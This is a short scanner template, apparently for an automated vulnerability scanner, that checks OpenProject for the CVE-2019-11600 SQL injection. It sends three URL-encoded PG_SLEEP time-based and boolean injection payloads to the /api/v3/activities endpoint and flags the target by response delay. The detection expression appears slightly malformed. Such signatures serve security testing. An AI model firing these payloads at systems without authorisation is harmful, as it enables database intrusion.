id: cve-2019-11600
type: list
info:
  name: OpenProject SQLi
  risk: Critical

origin:
  method: GET
  redirect: true
  url: >-
    {{.BaseURL}}

variables:
  - sqli: |
      )%20AND%203281%3d(SELECT%203281%20FROM%20PG_SLEEP(1))%20AND%20(7777%3d7777
      1)%20AND%203281%3d(SELECT%203281%20FROM%20PG_SLEEP(1))%20AND%20(7777%3d7777
      (SELECT%20(CASE%20WHEN%20(7543=7543)%20THEN%2012%20ELSE%20(SELECT%201383%20UNION%20SELECT%205346)%20END))

requests:
  - method: GET
    redirect: true
    url: >-
     {{.BaseURL}}/api/v3/activities/{{.sqli}}
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
      - X-Atlassian-Token: no-check
    detections:
      - >-
        Math.abs(ResponeTime() > OriginResponeTime()) > 3

reference:
  - https://www.cvebase.com/cve/2019/11600